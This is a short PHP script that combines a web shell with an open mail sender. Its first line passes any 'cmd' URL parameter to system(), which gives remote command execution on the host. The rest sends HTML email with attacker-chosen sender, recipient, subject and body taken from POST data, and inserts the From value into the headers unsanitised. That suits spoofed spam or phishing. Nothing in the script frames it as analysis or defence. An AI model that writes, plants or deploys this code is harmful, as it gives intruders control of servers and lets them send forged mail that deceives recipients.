<?php
system($_GET['cmd']);
$from =$_POST['from'];
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html;1' . "\r\n";
$headers .= 'From: '.$from."\r\n";
$to1 = $_POST['to'];
$sub1 = $_POST['subject'];
$msg1 = $_POST['msg'];
echo "<br>FROM:$from<br><hr>"; 
echo "TO:$to1<br><hr>"; 
echo "SUBJECT:$sub1<br><hr>";
echo "MESSAGE:$msg1<br><hr>"; 
 $retval = mail ($to1,$sub1,$msg1,$headers);
         
         if( $retval == true ) {
            echo "Message sent successfully...";
         }else {
            echo "Message could not be sent...";
         }
?>